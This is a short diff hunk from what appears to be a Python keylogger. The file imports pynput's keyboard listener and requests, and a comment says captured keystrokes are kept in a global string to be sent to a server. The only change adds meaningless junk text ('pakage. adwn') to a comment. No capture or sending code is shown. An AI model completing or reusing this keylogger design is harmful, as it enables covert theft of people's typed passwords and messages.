@@ -5,7 +5,7 @@ from pynput import keyboard
 import requests
 # To transform a Dictionary to a JSON string we need the json package.
 import json
-#  The Timer module is part of the threading package.
+#  The Timer module is part of the threading package. pakage. adwn
 import threading
 
 # We make a global variable text where we'll save a string of the keystrokes which we'll send to the server.
